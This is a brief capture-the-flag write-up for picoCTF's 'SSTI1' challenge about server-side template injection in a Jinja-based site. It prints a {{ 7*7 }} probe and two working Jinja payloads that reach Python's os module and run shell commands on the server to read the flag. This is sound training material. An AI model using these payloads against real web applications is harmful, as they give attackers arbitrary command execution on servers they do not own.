## SSTI1

**Server Side Template Injection** [link](https://play.picoctf.org/practice/challenge/492)

**Description**
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!

> Uses Python Jinja Template Engine. confirmed by ``{{ 7*7 }}``
> Finally executed with 
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

//check this too//
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘cat flag’).read() }}
```

